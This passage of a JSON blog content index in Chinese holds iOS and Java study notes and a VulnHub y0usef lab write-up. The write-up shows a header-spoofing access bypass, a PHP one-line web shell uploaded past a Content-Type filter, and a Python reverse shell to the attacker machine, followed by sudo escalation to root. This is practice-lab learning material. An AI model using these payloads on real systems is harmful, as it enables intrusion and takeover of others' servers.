修改原有字体expLabel.font = getFont(size: 38.0) 0x3. 设置圆形的Button在 xcode 中为 Button 添加如下属性： 代码实现： 1dotButton.layer.cornerRadius = 40.0 该属性为 Button 四角的弧度，经调整后即可实现圆形的 Button。 四、成果展示0x00. 完整流程https://blog.kekwy.com/media/iw1/01.mp4 0x01. 压力测试（随便乱按）https://blog.kekwy.com/media/iw1/test.mov","categories":[{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第一周 vulnhub-y0usef","slug":"vulnhub-y0usef","date":"2022-09-27T04:44:31.000Z","updated":"2022-11-06T14:33:08.969Z","comments":true,"path":"vulnhub-y0usef/","link":"","permalink":"http://blog.kekwy.com/vulnhub-y0usef/","excerpt":"","text":"第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&#x6b;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d; 2022年9月27日 一、实验准备靶机：y0usef 下载链接：https://www.vulnhub.com/entry/y0usef-1,624/ 攻击机：kali 二、实验目标取得目标靶机的root权限和2个flag。 三、实验内容 在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。 在kali中执行以下指令进行局域网主机发现： 1$ sudo arp-scan -I eth0 -l 扫描结果如下： 可以推断1出靶机 地址为 10.0.2.5 。 1： 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。 在kali中执行以下指令扫描靶机的端口状态： 1$ sudo nmap -p- 10.0.2.5 扫描结果如下： 发现开通了22、80两个端口，提示我们可以考虑靶机上的ssh与http服务。为了进一步确定各端口的用途，我们可以通过以下指令2获取对应的服务版本信息： 1$ sudo nmap -p22,80 -sV -sC 10.0.2.5 2: -p 对指定端口扫描 ​ -sV -sC 默认安全脚本扫描 扫描结果如下： 我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码： 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的robots.txt文件3： 但令人遗憾的是，我们并不能查看该文件。 3: Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。 使用whatweb工具查看web应用所采用的软件构架： 1$ whatweb http://10.0.2.5 尝试使用工具dirsearch爆破 web 服务端的路径，发现一些隐藏的路径和文件： 1$ dirsearch -u http://10.0.2.5 结果如下： 得知4服务器上有三个我们可以访问的文件： 123/adminstration/index.php/index.php/login 其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。 4: HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。 上述结果中出现的状态码的含义分别为： 状态码 含义 403 (禁止)服务器拒绝请求。 301 (永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。 200 (成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 访问10.0.2.5/adminstration： 提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式： 启动Burp Suit并启用拦截，将浏览器代理设置为127.0.0.1:8080（Burp Suit的默认代理端口为8080）。 刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入X-Forwarded-For: 127.0.0.15（如下图），再将其发送。【后续被拦截的数据包都需要插入上述内容。】 发现成功进入一个登录界面： 这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。 5: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。 简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。 首先编写一个“一句话木马”的PHP 文件shell.php，内容如下： 1&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var?&gt; 尝试直接将其上传，发现网站提示文件被拒绝： 推测网站可能存在针对文件类型的过滤6，我们可以通过修改被拦截的报文中Content-Type字段的值进行绕过： 修改为：image/png： 文件上传成功了，并提供了上传完成的文件的URL。 6: 常见的过滤形式与绕过方法： 针对文件扩展名的绕过： 修改文件扩展名后，再上传。 2)针对文件类型的绕过： 修改报文中的Content-Type字段（如本次实验）。 3)针对文件内容的绕过： 在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。 通过URL访问文件： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php 进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls 指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python 得到了靶机上的python路径，说明靶机有python环境： 故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）： 1$ nc -nvlp 4444 修改对应的python代码： 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444. 将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell： 使用以下指令对反弹shell进行一个简单的升级: 1$ python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; 查看&#x2F;etc&#x2F;passwd 文件7： 1$ cat /etc/passwd 注意到有以下一项： 1yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash 说明有一个叫yousef的用户可以登录系统8，且主目录为/home/yousef。 进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。 7: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开： 1用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell 8: 对于用户的登录shell： /bin/false 是最严格的禁止login选项，一切服务都不能用， /bin/nologin 只是不允许系统login，可以使用其他ftp等服务 因此我们一眼就锁定了yousef用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。 第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。 退出反弹shell，在kali的shell使用以下指令： 1$ ssh yousef@10.0.2.5 成功登入yousef后，查看该用户所在的用户组： 1$ id 发现该用户属于sudo组，查看该用户可执行的指令： 1$ sudo -l 发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份： 1$ sudo -i 查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。 至此我们实现了root权限的提取，并成功获取了所有的两个flag。 【完结撒花】","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"集合类与I/O操作","slug":"javaNotes-3","date":"2022-08-05T00:15:26.000Z","updated":"2022-08-06T15:39:01.691Z","comments":true,"path":"javaNotes-3/","link":"","permalink":"http://blog.kekwy.com/javaNotes-3/","excerpt":"","text":"数组的长度是固定的，集合的长度是可变的。 I. Collection接口 collection 接口时层次结构中的根接口，构成其的单位称为元素。 常用方法： 方法 功能描述 add(E e) 将指定的对象添加到该集合中 remove(Object o) 将指定的对象从该集合中移除 isEmpty() 返回boolean值，用于判断当前集合是否为空 iterator() 返回在此Collection的元素上进行迭代的迭代器，用于遍历集合中的对象 size() 返回int型值，获取该集合中元素的个数 通过迭代器遍历： 1234567import java.util.*;Collection&lt;String&gt; list = new ArrayList&lt;&gt;(); //将List实现类向上转型Iterator&lt;String&gt; it = list.iterator(); //创建迭代器while(it.hasNext()) &#123; //do something String str = (String) it.next();&#125; //遍历 tips：Iterator 的 next() 方法返回的是 Object 。 II. List集合 List集合包括List接口以及List接口的所有实现类； 允许元素重复，元素顺序就是对象的插入顺序； 包含Collection中的所有方法，此外还有如下两个重要方法： get(int index)：获得指定索引位置的元素； set(int index, Object obj)：将集合中指定索引位置的对象修改为指定的对象； 实现类：ArrayList（数组实现）、LinkedList（链表实现）。 III. Set集合 不按特定方式排序，不能包含重复元素，需要小心操作其中的可变对象； 实现类; HashSet：不保证迭代顺序永恒不变； TreeSet：额外实现了 java.util.SortedSet 接口，可以对集合中元素进行排序。 TreeSet 类增加的方法： 方法 功能描述 first() 返回此Set中当前第一个（最低）元素 last() 返回此Set中当前最后一个（最高）元素 comparator() 返回对此set中的元素进行排序的比较亲。如果此Set使用自然顺序，则返回null headSet(E toElement) 返回一个新的Set集合，新集合是 toElement（不包含）之前的所有对象 subSet(E fromElement, E toElement) 返回一个新的Set集合，是fromElement（包含）对象与toElement（不包含）对象之间的所有对象 tailSet(E fromElement) 返回一个新的Set集合，新集合包含对象 fromElement（包含）之后的所有对象 IV. Map集合 一个映射不能包含重复的key，每个key最多只有&#x3D;能映射到一个值。 常用方法： 方法 功能描述 put(K key, V value) 向集合中添加指定的可以呢与value的映射关系 containsKey(Object key) 如果此映射包含指定key的映射关系，则返回true containsValue(Object value) 如果此映射将一个或多个key映射到指定值，则返回true get(Object key) 如果存在指定的key对象，则返回该对象对应的值，否则返回null keySet() 返回该集合中的所有key对象形成的Set集合 values() 返回该集合中所有值对象形成的Collection集合 实现类： HashMap：基于哈希表实现，允许使用null值与null键，不保证顺序。（建议使用） TreeMap：可排序，不允许null键。 V. File类File构造方法 通过完整路径名（包含文件名）： 1File(String pathname); 通过父路径与子路径（包含文件名）： 1File(String parent, String child); 通过父路径对象与子路径（包含文件名）： 1File(File f, String pathname); 文件创建与删除123File file = new File(&quot;word.txt&quot;);file.delete(); //删除文件file.creatNewFile(); //创建文件 常用方法 方法 返回值 说明 getName() String 获取文件名称 canRead() boolean 判断文件是否为可读的 canWrite() boolean 判断文件是否可被写入 exits() boolean 判断文件是否存在 length() long 获取文件的长度（以字节为单位） getAbsolutePath() String 获取文件的绝对路径 getParent() String 获取文件的父路径 isFile() boolean 判断文件是否存在 isDirectory boolean 判断文件是否为一个目录 isHidden() boolean 判断文件是否为隐藏文件 lastModified() long 获取文件最后修改时间","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"类的高级特性与异常处理","slug":"javaNotes-2","date":"2022-08-01T11:50:13.000Z","updated":"2022-08-04T04:25:52.401Z","comments":true,"path":"javaNotes-2/","link":"","permalink":"http://blog.kekwy.com/javaNotes-2/","excerpt":"","text":"I. Java类包 类名冲突： 任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。 类的路径： 同一个类包中的类相互访问时，可以不指定包名； 同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。 指定包与导入包： 将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。 1package 包名; 导入包： 123import 包名.*import 包名.类名import 包名.静态方法名 tips: 使用 import 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。 II. final 关键字 变量： 修饰常量变量； 对象引用被 final 修饰后无法使其指向另一个对象； Java中定义全局变量，通常使用 public static final 修饰，是能在定义时被赋值。 方法： 被 final 修饰的方法不能被重写； private 方法隐式被指定为 final 类型。 类： 被修饰的类不能被继承。 III. 内部类成员内部类 基础用法： 成员内部类的定义：（非内部类不能被声明为private或protected访问类型） 12345public class OuterClass &#123; // 外部类 private class InnerClass &#123; // 内部类 //... &#125;&#125; 内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）； 内部类中的变量与外部类变量同名时，可以使用 this 指针加以区分： 1234// 若内部类与外部类中均有变量xthis.x; // 内部类的xOuterClass.this.x; // 外部类的xx; // 同名局部变量、形参（若有） 在外部类和非静态方法之外实例化内部类对象，需要使用外部类： 12OuterClass out = = new OuterClass();OuterClass.innerClass in = out.new innerClass(); 内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。 内部类向上转型为接口; 将一个权限修饰符为 private 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程； 对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法； 12345678910111213141516171819202122interface OutInterface &#123; public void f();&#125;class OuterClass &#123; // 定义一个外部不可访问的内部类 private class InnerClass implements OutInterface &#123; // 实现接口方法 public void f() &#123; // do something... &#125; &#125; public OutInterface doit &#123; return new InnerClass(); // 将内部类向上转型为外部接口 &#125;&#125;...OuterClass out = new OuterClass();OutInterface outinter = out.doit();outinter.f();... 外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口） 局部内部类 内部类可以在类的局部位置定义（如方法） 在方法中定义的内部类只能使用方法中被 final 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。 匿名内部类123return new A() &#123; ...//内部类体&#125;; 匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。 静态内部类 创建静态内部类的对象不需要其外部类的对象； 静态内部类的对象中不能访问非静态外部类的对象。 内部类的继承1234567891011public class OutputInnerClass extends ClassA.ClassB &#123; public OutputInnerClass(classA a) &#123; a.super(); // 生成B类的外部类对象 &#125;&#125;class ClassA &#123; class ClassB &#123; &#125;&#125; IV. 异常捕捉 try-catch 语句： 123456try &#123; // 可以发生异常的代码块&#125;catch(Exception e)&#123; // 异常处理&#125; finally 语句： 无论 try 中的语句是否发生异常，都会执行 finally 中的代码块。finally 不被执行的情况： finally 中发生异常； 之前的代码中使用 System.exit() 退出程序； 程序所在的线程死亡； 关闭CPU。 tips： Exception 是 try 代码传递给 catch 代码块的变量类型； 异常处理常用的函数： getMessage() ：输出错误性质； toString() ：给出异常的类型与性质； printStackTrace() ：指出异常的类型、性质、栈层次及出现在程序中的位置。 V. Java常见异常 异常类 说明 ClassCastException 类型转换异常 ClassNotFoundException 未找到相应类异常 ArithmeticException 算术异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ArrayStoreException 数组中包含不兼容的值抛出的异常 SQLException 操作数据库异常 NullPointerException 空指针异常 NoSuchFieldException 字段未找到异常 NoSuchMethodException 方法未找到异常 NumberFormatException 字符串转换为数字抛出的异常 NegativeArraySizeException 数组元素个数为负数抛出的异常 StringIndexOutOfBoundsException 字符串索引超出范围抛出的异常 IOException 输入输出异常 IllegalAccessException 不允许访问某类异常 InstantiationException 当应用程序试图使用 Class 类中的 new Instance() 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常 EOFException 文件已结束异常 FileNotFoundException 文件未找到异常 VI. 自定义异常12345public class MyException extends Exception &#123; public MyException(String ErrorMessage) &#123; // ErrorMessage为要输出的错误信息 super(ErrorMessage); // 调用父类构造方法 &#125;&#125; VII. 抛出异常 throws：用于指定方法可能抛出的异常，用于将异常向上抛出。 12static void pop() throws 异常1, 异常2, ... &#123;&#125; throw： 程序在执行到 throw 语句时立即终止，其后语句都不执行； throw 抛出的异常必须使用 try-catch 语句快捕捉； 若想向上级抛出异常，必须在抛出异常的方法中使用 throws。 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"接口、继承与多态","slug":"javaNotes-1","date":"2022-07-30T07:00:16.000Z","updated":"2022-08-01T11:51:42.005Z","comments":true,"path":"javaNotes-1/","link":"","permalink":"http://blog.kekwy.com/javaNotes-1/","excerpt":"","text":"I. 类的继承权限修饰关键字： private 外部以及子类均不可访问 public 外部以及子类均不可访问 protected 外部不可，但子类可以访问 定义类时通过关键字extends + 父类类名定义继承； 子类方法中可以通过super关键字调用父类方法（受权限修饰关键字约束）； 子类中可以通过定义与父类某一方法名称相同的函数实现对父类中该方法的重写（覆盖）； 重写时如修改方法的权限范围，只能从小到大； 重写时返回值必须与父类中同名函数返回值相同或为其子类； 子类实例化时会自动调用父类的无参构造方法，但若需调用有参构造方法需要通过super关键字手动调用； 子类finalize()方法需要保证最后一个动作是调用父类的finalize()方法； 1234567891011121314151617181920212223242526272829303132333435class Test &#123; public Test() &#123; //do something &#125; public void doSomething1() &#123; //do something &#125; private void doSomething2() &#123; //do something &#125; protected void doSomething3() &#123; //do something &#125; public Test doTest() &#123; //do something &#125;&#125;class Test1 extends Test&#123; public Test() &#123; super(); //调用父类构造方法 super.doSomething1(); &#125; public void doSomething3() &#123; //do something &#125; /* private void doSomething3() &#123; //do something &#125; 写法错误 */ public Test1 doTest() &#123; //do something &#125;&#125; II. Object类 Objcect 类是所有Java类的父类。 tips：Object 类中的 getClass() 、notify() 、notifyAll() 、wait() 等方法不能在子类中重写。（被定义为final类型） Object 类中的重要方法： getClass()：返回对象执行时的Class实例。（Unity的getObejct） toString()：将一个对象返回为字符串，一般需要根据需要在子类中重写. tips：将对象打印时将自动调用该方法。 equals()：默认使用“&#x3D;&#x3D;”运算符根据对象的引用（地址）判断是否相等。故一般需要按需重写。 III. 对象类型的转换 向上转型：将子类对象视为父类对象。由具体到抽象，总是安全的。 1Quadrangle obj = new Patallelogram(); // 平行四边形是四边形的子类 向下转型：将父类对象转换为子类对象，必须通过强制类型转换，且必须保证当前父类对象是目标子类对象的实例。 12Quadrangle p = new Patallelogram();Patallelogram q = (Patallelogram)p; IV. 使用instanceof操作符判断对象类型可用于实现向下转换时对父类对象实例类型的判断。 语法格式：（返回值为布尔型） 12myobject instanceof ExampleClass;// myobject对象是否为ExampleClass类的实例 V. 方法的重载同过定义同名方法但参数不完全相同的方式实现方法的重载，但单单返回值不同不能实现重载。 编译器利用方法名、方法各参数类型和参数的个数以及参数的顺序来确定类中的方法是否唯一。 不定长参数也可以参与实现重载： 12int add(int a);int add(int... a); VI. 抽象类与接口 抽象类 tips： 抽象类不能实例化对象； 只有抽象类才可以承载抽象方法； 抽象方法在其子类中必须被重写。 定义抽象类的关键字 abstract 。 123public abstract class Test &#123; abstract void testAbstract();&#125; 接口： 定义接口使用关键字 interface ： 1234public interface 接口名 &#123; void doSomething(); // 自动虚方法，可以省略abstract关键字&#125; public：接口可以像类一样被权限修饰符修饰，但public关键字仅限于接口在与其同名的文件中被定义时； 接口中的方法必须被定义为public或abstract形式。 实现接口使用关键字 implements ： tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。 123456789101112#1class 类名 implements 接口1，接口2, ... &#123; &#125;#2interface intf1 &#123; &#125;interface intf2 extends intf1 &#123; &#125; 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"}],"categories":[{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"},{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"},{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"},{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}]}